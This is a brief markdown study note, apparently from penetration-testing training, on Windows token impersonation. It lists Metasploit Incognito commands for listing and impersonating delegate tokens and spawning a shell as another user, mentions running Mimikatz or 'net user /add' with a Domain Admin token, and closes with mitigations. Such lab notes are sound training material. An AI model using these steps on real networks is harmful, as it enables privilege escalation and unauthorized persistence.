### Token Impersonation

Tokens are temp keys that allow access to a system/network without having to provide credentials, like cookies for computers  

Two types:  
&ensp;Delegate - created for logging into a machine or using Remote Desktop  
&ensp;Impersonate - 'non-interactive' such as attaching a network drive or a domain logon script  

Attacking Delegate Tokens with Incognito inside Metasploit  
&ensp;In Metasploit if you can pop a shell and get the `meterpreter >` prompt, you can `load incognito` and then `list_tokens -u` to have it spit out the available delegate tokens.  You then `impersonate_token pnpt\\fcastle` and then run `shell` and it should put you into a shell with the impersonated token.  
&ensp;`meterpreter > load incognito`  
&ensp;`meterpreter > list_tokens -u`
&ensp;&ensp;-u for user or -g for group  
&ensp;`meterpreter > impersonate_token <domain\\token>`  
&ensp;`meterpreter > shell`  
&ensp;This should load you into a shell as that user  

If you can get a Domain Admin token and use it, you can run tools with a higher privilege level like MimiKatz or net user /add to create a new user


Mitigation Strategies  
&ensp;Limit user/group token creation permission  
&ensp;Account Tiering  
&ensp;Local admin restriction
